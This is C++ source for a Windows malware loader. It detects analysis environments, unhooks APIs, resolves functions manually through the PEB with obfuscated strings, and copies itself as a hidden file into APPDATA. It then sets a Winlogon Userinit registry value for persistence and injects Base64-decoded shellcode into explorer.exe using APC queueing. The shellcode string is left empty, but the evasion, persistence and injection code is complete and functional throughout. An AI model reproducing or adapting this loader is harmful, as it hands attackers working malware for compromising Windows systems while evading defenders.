#undef UNICODE
#undef _UNICODE
#include <iostream>
#include <string>
#include <vector>
#include <winsock2.h>
#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <cwchar>
#include "obf.h"
#include "evasion.h"

#define ENABLE_STARTUP_PERSISTENCE 1

// --- Function Pointer Typedefs ---
typedef HMODULE(WINAPI* pGetModuleHandleA)(LPCSTR);
typedef FARPROC(WINAPI* pGetProcAddress)(HMODULE, LPCSTR);
typedef HANDLE(WINAPI* pCreateToolhelp32Snapshot)(DWORD, DWORD);
typedef BOOL(WINAPI* pProcess32First)(HANDLE, LPPROCESSENTRY32);
typedef BOOL(WINAPI* pProcess32Next)(HANDLE, LPPROCESSENTRY32);
typedef BOOL(WINAPI* pThread32First)(HANDLE, LPTHREADENTRY32);
typedef BOOL(WINAPI* pThread32Next)(HANDLE, LPTHREADENTRY32);
typedef HANDLE(WINAPI* pOpenProcess)(DWORD, BOOL, DWORD);
typedef HANDLE(WINAPI* pOpenThread)(DWORD, BOOL, DWORD);
typedef LPVOID(WINAPI* pVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL(WINAPI* pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
typedef DWORD(WINAPI* pQueueUserAPC)(PAPCFUNC, HANDLE, ULONG_PTR);
typedef BOOL(WINAPI* pCloseHandle)(HANDLE);
typedef BOOL(WINAPI* pVirtualFreeEx)(HANDLE, LPVOID, SIZE_T, DWORD);

// Using a struct to hold the function pointers to avoid global namespace pollution
// and make the code cleaner.
struct WinAPIs {
    pCreateToolhelp32Snapshot CreateToolhelp32Snapshot_ptr;
    pProcess32First Process32First_ptr;
    pProcess32Next Process32Next_ptr;
    pThread32First Thread32First_ptr;
    pThread32Next Thread32Next_ptr;
    pOpenProcess OpenProcess_ptr;
    pOpenThread OpenThread_ptr;
    pVirtualAllocEx VirtualAllocEx_ptr;
    pWriteProcessMemory WriteProcessMemory_ptr;
    pQueueUserAPC QueueUserAPC_ptr;
    pCloseHandle CloseHandle_ptr;
    pVirtualFreeEx VirtualFreeEx_ptr;
};

// --- Helper Functions ---

// Case-insensitive string comparison
int my_stricmp(const char* s1, const char* s2) {
    while (*s1 && (tolower(*s1) == tolower(*s2))) {
        s1++;
        s2++;
    }
    return *(const unsigned char*)s1 - *(const unsigned char*)s2;
}

// Manual implementation of GetModuleHandle to bypass some hooks
HMODULE get_module_handle_manual(const wchar_t* module_name) {
    PEB* peb = (PEB*)__readgsqword(0x60);
    PEB_LDR_DATA* ldr = peb->Ldr;
    LIST_ENTRY* head = &ldr->InMemoryOrderModuleList;
    LIST_ENTRY* curr = head->Flink;

    while (curr != head) {
        LDR_DATA_TABLE_ENTRY* entry = CONTAINING_RECORD(curr, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        if (entry->FullDllName.Buffer != nullptr) {
            const wchar_t* full_name = entry->FullDllName.Buffer;
            const wchar_t* base_name = wcsrchr(full_name, L'\\');
            if (base_name == nullptr) {
                base_name = full_name;
            } else {
                base_name++;
            }
            if (_wcsicmp(base_name, module_name) == 0) {
                return (HMODULE)entry->DllBase;
            }
        }
        curr = curr->Flink;
    }
    return NULL;
}

// Manual implementation of GetProcAddress
FARPROC get_proc_address_manual(HMODULE h_mod, const char* func_name) {
    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)h_mod;
    PIMAGE_NT_HEADERS nt_headers = (PIMAGE_NT_HEADERS)((BYTE*)h_mod + dos_header->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY export_dir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)h_mod + nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    PDWORD addr_of_funcs = (PDWORD)((BYTE*)h_mod + export_dir->AddressOfFunctions);
    PDWORD addr_of_names = (PDWORD)((BYTE*)h_mod + export_dir->AddressOfNames);
    PWORD addr_of_name_ordinals = (PWORD)((BYTE*)h_mod + export_dir->AddressOfNameOrdinals);

    for (DWORD i = 0; i < export_dir->NumberOfNames; i++) {
        if (my_stricmp(func_name, (const char*)h_mod + addr_of_names[i]) == 0) {
            return (FARPROC)((BYTE*)h_mod + addr_of_funcs[addr_of_name_ordinals[i]]);
        }
    }
    return NULL;
}

// Decodes a Base64 encoded string
std::string base64_decode(std::string const& encoded_string) {
    std::string base64_chars =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "abcdefghijklmnopqrstuvwxyz"
        "0123456789+/";
    std::string decoded;
    std::vector<int> T(256, -1);
    for (int i = 0; i < 64; i++) T[base64_chars[i]] = i;

    int val = 0, valb = -8;
    for (char c : encoded_string) {
        if (T[c] == -1) break;
        val = (val << 6) + T[c];
        valb += 6;
        if (valb >= 0) {
            decoded.push_back(char((val >> valb) & 0xFF));
            valb -= 8;
        }
    }
    return decoded;
}

// Finds a process ID by its name
DWORD get_proc_id(WinAPIs& api, const char* proc_name) {
    DWORD proc_id = 0;
    HANDLE h_snap = api.CreateToolhelp32Snapshot_ptr(TH32CS_SNAPPROCESS, 0);
    if (h_snap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 proc_entry;
        proc_entry.dwSize = sizeof(proc_entry);
        if (api.Process32First_ptr(h_snap, &proc_entry)) {
            do {
                if (!my_stricmp(proc_entry.szExeFile, proc_name)) {
                    proc_id = proc_entry.th32ProcessID;
                    break;
                }
            } while (api.Process32Next_ptr(h_snap, &proc_entry));
        }
        api.CloseHandle_ptr(h_snap);
    }
    return proc_id;
}

// --- Persistence ---

bool RegisterSystemTask(const std::string& executablePath) {
    HKEY hKey;
    std::string winlogonKeyStr = OBF_STR("Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
    std::string valueNameStr = OBF_STR("Userinit");

    LONG openRes = RegOpenKeyExA(HKEY_CURRENT_USER, winlogonKeyStr.c_str(), 0, KEY_WRITE, &hKey);
    if (openRes != ERROR_SUCCESS) {
        return false;
    }

    // IMPORTANT: This technique appends to the existing Userinit value.
    // A more robust implementation would read the existing value first.
    std::string value_str = OBF_STR("C:\\Windows\\system32\\userinit.exe,") + executablePath;

    LONG setRes = RegSetValueExA(hKey, valueNameStr.c_str(), 0, REG_SZ, (const BYTE*)value_str.c_str(), value_str.length() + 1);
    RegCloseKey(hKey);
    return setRes == ERROR_SUCCESS;
}

enum RelocateResult { RELOCATE_SUCCESS, RELOCATE_ALREADY_EXISTS, RELOCATE_FAILED };

RelocateResult RelocateModule(std::string& newPath) {
    char currentPath[MAX_PATH];
    GetModuleFileNameA(NULL, currentPath, MAX_PATH);

    const char* appDataPath = getenv(OBF_STR("APPDATA").c_str());
    if (appDataPath == NULL) return RELOCATE_FAILED;

    newPath = std::string(appDataPath) + OBF_STR("\\userinitext.exe");

    if (!CopyFileA(currentPath, newPath.c_str(), FALSE)) { // FALSE = Overwrite
        if (GetLastError() == ERROR_FILE_EXISTS) {
             // We can ignore this, as we want to ensure the latest version is there.
        } else {
            return RELOCATE_FAILED;
        }
    }
    SetFileAttributesA(newPath.c_str(), FILE_ATTRIBUTE_HIDDEN);
    return RELOCATE_SUCCESS;
}


// --- Main ---

int main() {
    if (Evasion::isAnalysisEnvironment()) {
        return 1;
    }
    Evasion::unhookCriticalAPIs();

#if ENABLE_STARTUP_PERSISTENCE
    std::string newPath;
    RelocateResult relocateResult = RelocateModule(newPath);
    if (relocateResult != RELOCATE_FAILED) { // Success or already exists
        RegisterSystemTask(newPath);
    }
#endif

    // --- Resolve APIs ---
    WinAPIs api;
    std::string kernel32_dll_str = OBF_STR("kernel32.dll");
    std::wstring kernel32_dll_wstr(kernel32_dll_str.begin(), kernel32_dll_str.end());
    HMODULE h_kernel32 = get_module_handle_manual(kernel32_dll_wstr.c_str());

    api.CreateToolhelp32Snapshot_ptr = (pCreateToolhelp32Snapshot)get_proc_address_manual(h_kernel32, OBF_STR("CreateToolhelp32Snapshot").c_str());
    api.Process32First_ptr = (pProcess32First)get_proc_address_manual(h_kernel32, OBF_STR("Process32First").c_str());
    api.Process32Next_ptr = (pProcess32Next)get_proc_address_manual(h_kernel32, OBF_STR("Process32Next").c_str());
    api.Thread32First_ptr = (pThread32First)get_proc_address_manual(h_kernel32, OBF_STR("Thread32First").c_str());
    api.Thread32Next_ptr = (pThread32Next)get_proc_address_manual(h_kernel32, OBF_STR("Thread32Next").c_str());
    api.OpenProcess_ptr = (pOpenProcess)get_proc_address_manual(h_kernel32, OBF_STR("OpenProcess").c_str());
    api.OpenThread_ptr = (pOpenThread)get_proc_address_manual(h_kernel32, OBF_STR("OpenThread").c_str());
    api.VirtualAllocEx_ptr = (pVirtualAllocEx)get_proc_address_manual(h_kernel32, OBF_STR("VirtualAllocEx").c_str());
    api.WriteProcessMemory_ptr = (pWriteProcessMemory)get_proc_address_manual(h_kernel32, OBF_STR("WriteProcessMemory").c_str());
    api.QueueUserAPC_ptr = (pQueueUserAPC)get_proc_address_manual(h_kernel32, OBF_STR("QueueUserAPC").c_str());
    api.CloseHandle_ptr = (pCloseHandle)get_proc_address_manual(h_kernel32, OBF_STR("CloseHandle").c_str());
    api.VirtualFreeEx_ptr = (pVirtualFreeEx)get_proc_address_manual(h_kernel32, OBF_STR("VirtualFreeEx").c_str());

    // --- Shellcode ---
    // The shellcode should be Base64 encoded and placed inside the OBF_STR macro.
    std::string encoded_shellcode = OBF_STR("");
    std::string decoded_shellcode = base64_decode(encoded_shellcode);

    // --- APC Injection ---
    DWORD proc_id = get_proc_id(api, OBF_STR("explorer.exe").c_str());
    if (proc_id == 0) return 1;

    HANDLE h_proc = api.OpenProcess_ptr(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, proc_id);
    if (h_proc == NULL) return 1;

    LPVOID remote_mem = api.VirtualAllocEx_ptr(h_proc, NULL, decoded_shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (remote_mem == NULL) {
        api.CloseHandle_ptr(h_proc);
        return 1;
    }

    if (!api.WriteProcessMemory_ptr(h_proc, remote_mem, decoded_shellcode.c_str(), decoded_shellcode.size(), NULL)) {
        api.VirtualFreeEx_ptr(h_proc, remote_mem, 0, MEM_RELEASE);
        api.CloseHandle_ptr(h_proc);
        return 1;
    }

    HANDLE h_snap = api.CreateToolhelp32Snapshot_ptr(TH32CS_SNAPTHREAD, 0);
    if (h_snap != INVALID_HANDLE_VALUE) {
        THREADENTRY32 thread_entry;
        thread_entry.dwSize = sizeof(thread_entry);
        if (api.Thread32First_ptr(h_snap, &thread_entry)) {
            do {
                if (thread_entry.th32OwnerProcessID == proc_id) {
                    HANDLE h_thread = api.OpenThread_ptr(THREAD_SET_CONTEXT | THREAD_QUERY_INFORMATION, FALSE, thread_entry.th32ThreadID);
                    if (h_thread) {
                        api.QueueUserAPC_ptr((PAPCFUNC)remote_mem, h_thread, (ULONG_PTR)NULL);
                        api.CloseHandle_ptr(h_thread);
                    }
                }
            } while (api.Thread32Next_ptr(h_snap, &thread_entry));
        }
        api.CloseHandle_ptr(h_snap);
    }

    api.CloseHandle_ptr(h_proc);

    return 0;
}